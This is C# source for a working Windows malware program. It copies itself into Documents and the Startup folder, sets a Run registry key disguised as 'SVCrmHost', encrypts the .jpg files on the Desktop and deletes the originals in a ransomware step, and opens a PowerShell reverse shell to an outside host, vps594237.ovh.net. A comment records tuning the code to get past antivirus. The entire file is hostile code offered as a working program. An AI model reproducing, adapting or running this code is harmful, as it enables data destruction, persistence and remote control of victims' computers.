using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Linq;

// Used for run key
using Microsoft.Win32;

// Used for reverse shell
using System.Net.Sockets;

// Used for encryption
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace axano
{
    class Program
    {

        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        public static extern bool ZeroMemory(IntPtr Destination, int Length);
        public static void FileEncrypt(string inputFile, string password)
        {

            //generate random salt
            byte[] salt = GenerateRandomSalt();

            //create output file name
            FileStream fsCrypt = new FileStream(inputFile + ".aes", FileMode.Create);

            //convert password string to byte arrray
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            //Set Rijndael symmetric encryption algorithm
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;


            //"What it does is repeatedly hash the user password along with the salt." High iteration counts.
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            AES.Mode = CipherMode.CFB;

            // write salt to the begining of the output file, so in this case can be random every time
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {

                    cs.Write(buffer, 0, read);
                }

                // Close up
                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
            }
        }

        static StreamWriter streamWriter;
        static void Main(string[] args)
        {
            // check if it is already running
            check();
            //persistence 2 ways
            //run key 
            pers_a();
            //startup folder
            pers_b();

            //ransomware
            //encrypt sample files txt aes + password
            ransom();
            //phone home reverse shell
            phone_home();

        }

        public static void check()
        {
            Process p = Process.GetCurrentProcess();
            string cMyProcessName = p.ProcessName;
            int counter = 0;
            foreach (Process clsProcess in Process.GetProcesses())
            {
                if (clsProcess.ProcessName.Contains(cMyProcessName) )
                {
                    counter++;
                    if (counter > 1)                
                        Environment.Exit(1);
                }
                else
                {
                   
                }
            }
        }

        public static void pers_a() 
        {
            
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + AppDomain.CurrentDomain.FriendlyName))
            {
                    File.Copy(AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName, Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + AppDomain.CurrentDomain.FriendlyName, true);
            }
            var rWrite = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rWrite.SetValue("SVCrmHost", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\" + AppDomain.CurrentDomain.FriendlyName);
            
        }
        public static void pers_b()
        {
            
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + AppDomain.CurrentDomain.FriendlyName))
            {
                File.Copy(AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + AppDomain.CurrentDomain.FriendlyName, true);
            }
            
        }
        public static void ransom() {
            
            string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

            string password = String.Concat(chars.Substring(4,1)+ chars.Substring(0,1) + chars.Substring(14,1) + chars.Substring(14,1) + chars.Substring(32,1) + chars.Substring(0,1) + chars.Substring(0, 1) + chars.Substring(14, 15) + chars.Substring(14, 1) + chars.Substring(32, 1) + chars.Substring(0, 1) + chars.Substring(0, 1) + chars.Substring(14, 1) + chars.Substring(14, 1) + chars.Substring(32, 1) + chars.Substring(0, 1));
            

            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            Console.WriteLine("desktop path {0}", desktop);
            string[] fileEntries = Directory.GetFiles(desktop);
            foreach (string fileName in fileEntries)
            {
                if (fileName.EndsWith(".jpg"))
                {
                    FileEncrypt(fileName, password);
                    File.Delete(fileName);
                }
            }
            
        }

        public static void phone_home()
        {
            
            TcpClient client = null;
            String host = "vps594237.ovh.net";
            int[] ports = new int[] { 51253, 51252, 51251 };

        Connect:
            client = null;
            Random r = new Random();
            while (client == null)
            {
                foreach (int port in ports.OrderBy(x => r.Next()))
                {
                    try
                    {
                        Console.WriteLine("trying to conenct to {0}:{1}.", host, port);
                        client = new TcpClient(host, port);
                        break;
                    }
                    catch
                    {
                        Console.WriteLine("Conenction to {0}:{1} failed.", host, port);
                    }
                }
            }


            
            using (Stream stream = client.GetStream())
            {
                using (StreamReader rdr = new StreamReader(stream))
                {
                    
                    streamWriter = new StreamWriter(stream);

                    StringBuilder strInput = new StringBuilder();
                    
                    Process p = new Process();

                    p.StartInfo.FileName = "powershell.exe";
                    // FLAGGED BY AV
                    /*
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.UseShellExecute = false;
                    */
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardInput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                    p.ErrorDataReceived += new DataReceivedEventHandler(CmdErrorDataHandler);
                    
                    p.Start();
                    p.BeginOutputReadLine();
                    p.BeginErrorReadLine();
                    
                    while (true)
                    {
                        try
                        {
                            strInput.Append(rdr.ReadLine());
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }

                        catch
                        {
                            
                            goto Connect;
                        }
                    }
                    
                }
            }
                    client.Close();
           
        }
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception) { }
            }
        }

        private static void CmdErrorDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception) { }
            }
        }
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    // Fille the buffer with the generated data
                    rng.GetBytes(data);
                }
            }

            return data;
        }
       
    }
}

